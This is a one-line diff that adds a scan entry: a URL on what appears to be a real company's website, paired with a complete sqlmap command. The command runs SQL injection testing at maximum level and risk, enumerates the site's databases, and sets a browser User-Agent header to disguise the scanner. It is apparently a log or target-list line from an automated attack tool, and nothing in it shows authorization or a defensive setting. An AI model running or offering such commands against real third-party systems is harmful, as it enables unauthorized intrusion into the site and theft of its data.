@@ -1,0 +1,1 @@
+https://www.infinitycapital.bh/?id=1&search=test&page=2 (GET)  # /usr/bin/sqlmap -u https://www.infinitycapital.bh/?id=1&search=test&page=2 --batch --level=5 --risk=3 --dbs --threads=4 "--headers=User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126 Safari/537.36" --output-dir=tool_outputs/sqlmap_home
